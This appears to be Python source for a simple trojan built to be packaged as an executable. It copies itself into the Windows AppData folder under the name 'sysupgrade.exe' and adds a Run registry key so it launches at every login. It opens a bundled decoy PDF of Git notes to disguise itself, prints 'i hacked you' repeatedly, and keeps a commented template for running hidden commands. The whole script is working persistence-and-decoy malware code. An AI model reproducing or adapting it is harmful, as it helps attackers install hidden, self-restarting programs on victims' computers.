import time
import sys
import subprocess
import os
import shutil

def add_to_registry():
    new_file = os.environ["Appdata"]+ "\\sysupgrade.exe"
    if not os.path.exists(new_file):
        shutil.copyfile(sys.executable,new_file)
        regedit_command = "reg add HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v upgrade /t REG_SZ /d " + new_file
        subprocess.call(regedit_command,shell=True)

add_to_registry()

def open_added_file():
    added_file = sys._MEIPASS + "\\GitNotesForProfessionals.pdf"
    subprocess.Popen(added_file,shell=True)

open_added_file()

x = 0

while x <100:
    print("i hacked you")
    time.sleep(0.2)
    x+=1

#subprocess.check_output("command",shell=True,stderr=subprocess.DEVNULL,stdin=subprocess.DEVNULL)
